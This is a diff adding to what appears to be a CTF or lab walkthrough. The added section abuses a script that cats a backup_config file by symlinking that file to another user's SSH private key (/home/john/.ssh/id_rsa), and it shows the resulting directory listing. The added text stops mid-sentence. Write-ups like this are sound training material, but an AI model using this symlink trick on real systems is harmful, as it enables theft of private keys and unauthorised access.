@@ -512,6 +512,19 @@ if [ -f "$CONFIG_FILE" ]; then
     echo "[$(date)] Configuration processed and removed" >> "$LOG_FILE"
 ```
 
-Its using cat to output the contents of the `file`, what if i simply add a symlink to the file 
+Its using cat to output the contents of the `backup_config` file, what if i simply add a symlink to the file so it cats out the contents of a SSH private key
+
+# Access as `john` on SSH
+
+```python
+phil@web-01:/home/phil/backup_staging$ ln -sf /home/john/.ssh/id_rsa backup_config
+phil@web-01:/home/phil/backup_staging$ ls -al
+total 8
+drwxr-xr-x  2 phil phil 4096 Sep  1 23:08 .
+drwxr-xr-x 16 phil phil 4096 Sep  1 22:32 ..
+lrwxrwxrwx  1 phil phil   22 Sep  1 23:08 backup_config -> /home/john/.ssh/id_rsa
+```
+
+First ill 
 
 
